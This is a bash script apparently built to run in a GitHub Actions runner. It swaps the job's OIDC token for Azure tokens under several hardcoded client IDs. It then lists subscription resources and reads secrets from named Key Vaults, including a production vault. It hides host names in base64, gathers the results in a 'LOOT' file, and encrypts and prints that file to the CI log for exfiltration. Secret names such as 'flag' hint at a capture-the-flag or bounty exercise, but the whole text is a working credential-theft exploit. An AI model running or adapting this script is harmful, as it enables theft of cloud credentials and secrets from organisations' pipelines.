#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
KVH=$(b 'dmF1bHQuYXp1cmUubmV0')
ARMH=$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
say "OIDCLEN=${#OIDC}"
exch(){ curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$2"; }
for CID in eeab432e-1bf6-400e-b155-a28ce7cafcdb 7a85156a-01c4-4e61-8472-40a92107159b 72ff278a-9e71-43ec-bac4-2ca303f8e462; do
  R=$(exch "$CID" "${SC}${ARMH}/.default")
  if echo "$R" | grep -q access_token; then
    say "!!!!! FIC WORKS for client $CID (ARM)"
    AT=$(echo "$R" | jq -r .access_token)
    say "  apps: $(curl -sS -H "Authorization: Bearer $AT" "${SC}${ARMH}/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resources?api-version=2021-04-01" | head -c 600)"
  else
    say "FIC no for $CID => $(echo "${R:0:220}")"
  fi
  for S in "${SC}${KVH}/.default" "https://storage.azure.com/.default" "https://graph.microsoft.com/.default"; do
    R2=$(exch "$CID" "$S")
    if echo "$R2" | grep -q access_token; then
      say "  TOKEN OK $CID scope=$S len=$(echo "$R2" | jq -r .access_token | wc -c)"
      if [ "$S" = "${SC}${KVH}/.default" ]; then
        T2=$(echo "$R2" | jq -r .access_token)
        say "   kv-sec list: $(curl -sS -H "Authorization: Bearer $T2" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets?api-version=7.4&maxresults=25" | head -c 800)"
        for N in flag platform-flag df26 DF26 flag-df26 tbl-flag legacy-admin-principal; do
          say "   sec $N: $(curl -sS -H "Authorization: Bearer $T2" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets/${N}?api-version=7.4" | head -c 400)"
        done
        say "   kv-prod list: $(curl -sS -H "Authorization: Bearer $T2" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets?api-version=7.4&maxresults=25" | head -c 400)"
      fi
    fi
  done
done
say "=== appcfg blob attempts with any storage tokens ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
